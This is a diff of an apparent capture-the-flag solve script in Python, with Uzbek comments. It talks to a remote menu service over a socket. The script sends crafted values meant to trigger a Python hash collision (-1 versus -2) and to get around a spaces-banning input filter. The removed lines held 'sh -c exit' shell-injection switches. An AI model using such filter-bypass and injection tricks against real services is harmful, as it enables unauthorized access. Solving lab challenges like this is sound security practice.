@@ -13,43 +13,45 @@ def solve():
         s.connect((host, port))
 
         def send_option(choice, data):
-            time.sleep(0.4)
+            time.sleep(0.5)
+            # Menyuni tozalash (o'qib olish)
+            try:
+                s.recv(2048)
+            except:
+                pass
             s.sendall(f"{choice}\n".encode())
-            time.sleep(0.4)
+            time.sleep(0.5)
             s.sendall(f"{data}\n".encode())
+            print(f"[+] Option {choice} -> {data}")
 
-        # 1. Mode: 1 deb kiritamiz (chunki returncode orqali o'ynaymiz)
-        send_option("1", "1")
+        # 1. Mode: -1 (Hash kolliziyasi uchun asos)
+        send_option("1", "-1")
 
-        # 2. Bin: 'sh' (shell)
-        send_option("2", "sh")
+        # 2. Bin: "ls" (Ruxsat berilgan: faqat harflar)
+        send_option("2", "ls")
 
-        # 3. Arguments: Bu yerda hiyla ishlatamiz. 
-        # Birinchi argument mavjud bo'lmagan fayl bo'lsin (-c exit 1 qaytarsin)
-        # Ikkinchi argument boshqa turdagi xato qaytarsin.
-        # Lekin 'sh' bin bo'lgani uchun switchlarni o'zgartirish osonroq.
-        send_option("3", ".,.") 
+        # 3. Arguments: ".,.." (Joriy papka va bitta yuqori papka)
+        # Bular mavjud bo'lgani uchun xato bermasligi mumkin (returncode 0)
+        send_option("3", ".,..")
 
-        # 4. Switches: 
-        # sh -c "exit 1"  => returncode 1
-        # sh -c "exit 2"  => returncode 2 (Lekin bizga hash collision kerak)
-        
-        # PYTHON HASH COLLISION: hash(-1) == hash(-2)
-        # Bizga debug[0] = -1 va debug[1] = -2 kerak.
-        # Buning uchun mode = -1 qilamiz va returncode'larni 1 va 2 qilamiz.
-        
-        print("[*] Re-configuring for hash collision (-1 and -2)...")
-        send_option("1", "-1") # mode = -1
-        send_option("4", "-c exit 1,-c exit 2") # switches
+        # 4. Switches: "a,b"
+        # ls a va ls b buyruqlari ishga tushadi. 
+        # Agar 'a' va 'b' degan papkalar yo'q bo'lsa, ls xato qaytaradi.
+        # Bizga ikki xil returncode kerak.
+        # Diqqat: check_values funksiyasi bo'sh joyni ruxsat bermaydi!
+        # Shuning uchun switches qismiga ham faqat harf beramiz.
+        send_option("4", "A,B") 
 
         # 5. Beat the competitor!
-        print("[!] Triggering...")
+        print("[!] Hash collision trigger qilinmoqda...")
         time.sleep(0.5)
         s.sendall(b"5\n")
 
         time.sleep(1)
         response = s.recv(4096).decode('utf-8', errors='ignore')
+        
         print("\n" + "="*40)
+        print("SERVER JAVOBI:")
         print(response.strip())
         print("="*40)
 
